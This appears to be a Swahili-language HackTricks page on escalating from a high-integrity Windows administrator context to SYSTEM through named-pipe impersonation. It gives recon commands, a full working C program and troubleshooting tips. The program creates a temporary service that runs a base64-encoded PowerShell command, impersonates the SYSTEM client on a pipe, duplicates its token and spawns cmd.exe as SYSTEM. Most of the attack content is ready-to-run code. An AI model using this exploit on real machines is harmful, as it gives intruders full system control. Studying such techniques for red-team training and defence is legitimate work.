# Kutoka High Integrity hadi SYSTEM kwa Name Pipes

{{#include ../../banners/hacktricks-training.md}}

Hii ni **administrator/SCM variant** ya named-pipe impersonation: mchakato ulioinuliwa huunda service ya muda ambayo child process yake huunganishwa kama `SYSTEM`, kisha huiga utambulisho wa client huyo. Ikiwa context ya kuanzia haiwezi kuunda services lakini ina `SeImpersonatePrivilege`, tumia privileged-service coercion badala yake; tazama [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) na [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). Kuunda service kunahitaji access kwa SCM na `SERVICE_START` access kwa service mpya, huku `CreateProcessWithTokenW` ikihitaji `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>

Thibitisha haraka context ya kuanzia inayotarajiwa:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Mtiririko wa code:**

1. Unda server ya named-pipe **kabla** ya kuanzisha service. Wakati wa kusubiri, chukulia `ConnectNamedPipe` inayorudisha `FALSE` pamoja na `ERROR_PIPE_CONNECTED` kama mafanikio: hii inamaanisha client ilishinda race na ika-connect kati ya `CreateNamedPipe` na `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
2. Unda na uanzishe service itakayo-connect kwenye pipe iliyoundwa na kuandika kitu. Code ya service itatekeleza code hii ya PS iliyosimbwa: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Baada ya service ku-connect na kuandika, ita `ImpersonateNamedPipeClient`, fungua thread token inayopatikana, kisha i-duplicate kama primary token.<sup>[[1]](#references)</sup>
4. Tumia primary token hiyo ku-spawn `cmd.exe`.<sup>[[2]](#references)</sup>

Njia hii inachukulia kuwa caller anaweza kuunda/kuanzisha service na ana privileges zinazohitajika na `CreateProcessWithTokenW` (kwa kawaida `SeImpersonatePrivilege`). Hii ni technique ya high-integrity-to-SYSTEM, si primitive inayopatikana kwa arbitrary low-privileged user.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Ikiwa uundaji/uanishaji wa service utashindwa, sample haitoi signal kwa pipe thread na inaweza kusubiri bila kikomo. Ongeza error handling na overlapped pipe timeout kabla ya kuitumia nje ya lab. Pia tumia jina random la pipe/service ili kuepuka collisions.

`ImpersonateNamedPipeClient` inachukua context inayohusishwa na **last message read**, kwa hiyo connection pekee haitoshi: mfanye client mwenye privileges aandike, thibitisha kuwa `ReadFile` ilirudisha data, na ndipo ufanye impersonation. Duplicate thread impersonation token iwe `TokenPrimary` token yenye `SecurityImpersonation`; primary token ndiyo inayotumiwa na process-creation API.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Utatuzi wa hitilafu

- `ConnectNamedPipe == FALSE` with `ERROR_PIPE_CONNECTED`: endelea; pipe tayari imeunganishwa.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` inashindwa kwa `ERROR_CANNOT_IMPERSONATE` (`1368`): thibitisha kuwa SYSTEM client iliandika data na `ReadFile` ilikamilika. Pia kagua impersonation level iliyoombwa na client; clients za kiwango cha identification/anonymous haziwezi kuigwa kikamilifu.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` inashindwa kwa `ERROR_PRIVILEGE_NOT_HELD` (`1314`): caller wa awali hana `SeImpersonatePrivilege`. Kutoka kwenye high-integrity administrator context, tumia token-copy route iliyoandikwa katika [SeImpersonate from High To System](seimpersonate-from-high-to-system.md), au tumia `CreateProcessAsUserW` huku uki-impersonate SYSTEM ikiwa privileges zinazohitajika zipo.<sup>[[2]](#references)</sup>
- `CreateServiceA` inarudisha `ERROR_SERVICE_EXISTS` (`1073`): futa ingizo la zamani la `PiperSrv` au randomize `PIPESRV`; kila mara futa temporary service baada ya trigger.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
